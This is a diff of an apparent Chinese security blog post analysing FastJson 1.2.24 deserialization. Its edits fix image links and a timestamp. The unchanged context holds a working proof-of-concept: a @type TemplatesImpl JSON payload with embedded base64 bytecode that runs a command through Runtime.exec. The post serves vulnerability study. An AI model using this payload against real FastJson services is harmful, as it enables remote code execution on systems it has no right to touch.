@@ -28,7 +28,7 @@
 <meta property="og:description" content="前言初探FastJson，version &#x3D; 1.2.24 FastJsonFastjson是Alibaba开发的Java语言编写的高性能 JSON 库，用于将数据在 JSON 和 Java Object 之间互相转换，提供两个主要接口 JSON.toJSONString 和 JSON.parseObject&#x2F;JSON.parse 来分别实现序列化和反序列化操作。">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/FastJson/image-20220310152515276.png">
-<meta property="og:image" content="http://example.com/2022/03/23/AppData/Roaming/Typora/typora-user-images/image-20220315000730650.png">
+<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/Fastjson/image-20220315000730650.png">
 <meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/FastJson/image-20220317205210459.png">
 <meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/FastJson/image-20220317205423541.png">
 <meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/FastJson/image-20220317205759624.png">
@@ -76,7 +76,7 @@
 <meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/Fastjson/image-20220323180940426.png">
 <meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/Fastjson/image-20220323181453995.png">
 <meta property="article:published_time" content="2022-03-23T10:40:42.066Z">
-<meta property="article:modified_time" content="2022-03-23T10:40:31.508Z">
+<meta property="article:modified_time" content="2022-03-23T10:45:31.146Z">
 <meta property="article:author" content="Y0ng">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://gitee.com/yongsheng220/image/raw/master/FastJson/image-20220310152515276.png">
@@ -271,7 +271,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2022-03-23 18:40:42 / 修改时间：18:40:31" itemprop="dateCreated datePublished" datetime="2022-03-23T18:40:42+08:00">2022-03-23</time>
+              <time title="创建时间：2022-03-23 18:40:42 / 修改时间：18:45:31" itemprop="dateCreated datePublished" datetime="2022-03-23T18:40:42+08:00">2022-03-23</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -324,7 +324,7 @@
 </ul>
 <p>前两个最主要的区别就是 <strong>parseObject</strong> 返回的是 <strong>JSONObject</strong> 而 <strong>parse</strong> 返回的是实际类型的对象，当在没有对应类的定义的情况下，通常情况下都会使用 <strong>JSON.parseObject</strong> 来获取数据。</p>
 <p>当使用 JSON.parseObject或者JSONObject.parseObject(JSON的一个子类)反序列化时，会触发 set 和 get 方法，使用parse处理只会触发 set 方法</p>
-<p><img src="../AppData/Roaming/Typora/typora-user-images/image-20220315000730650.png" alt="image-20220315000730650"></p>
+<p><img src="https://gitee.com/yongsheng220/image/raw/master/Fastjson/image-20220315000730650.png" alt="image-20220315000730650"></p>
 <h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p><strong>使用 SerializerFeature.WriteClassName 时</strong> 会在序列化中写入当前的 <strong>type</strong>， <strong>@type</strong> 可以 <strong>指定反序列化任意类</strong>，<strong>调用其set，get，is方法</strong>。而问题恰恰出现在了这个特性，我们可以配合一些存在问题的类，然后继续操作，造成RCE的问题</p>
 <h1 id="流程跟进"><a href="#流程跟进" class="headerlink" title="流程跟进"></a>流程跟进</h1><p>以 TemplatesImpl 加载字节码为例子分析</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">fastjsonDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String payload = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQAKcG9jXzEuamF2YQwACAAJBwAhDAAiACMBAARjYWxjDAAkACUBAAVwb2NfMQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAsAAAAOAAMAAAAJAAQACgANAAsADAAAAAQAAQANAAEADgAPAAEACgAAABkAAAAEAAAAAbEAAAABAAsAAAAGAAEAAAAOAAEADgAQAAIACgAAABkAAAADAAAAAbEAAAABAAsAAAAGAAEAAAARAAwAAAAEAAEAEQAJABIAEwACAAoAAAAlAAIAAgAAAAm7AAVZtwAGTLEAAAABAAsAAAAKAAIAAAATAAgAFAAMAAAABAABABQAAQAVAAAAAgAW\&quot;],&#x27;_name&#x27;:&#x27;c.c&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123;&#125;,\&quot;_name\&quot;:\&quot;a\&quot;,\&quot;_version\&quot;:\&quot;1.0\&quot;,\&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(payload, Feature.SupportNonPublicField);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
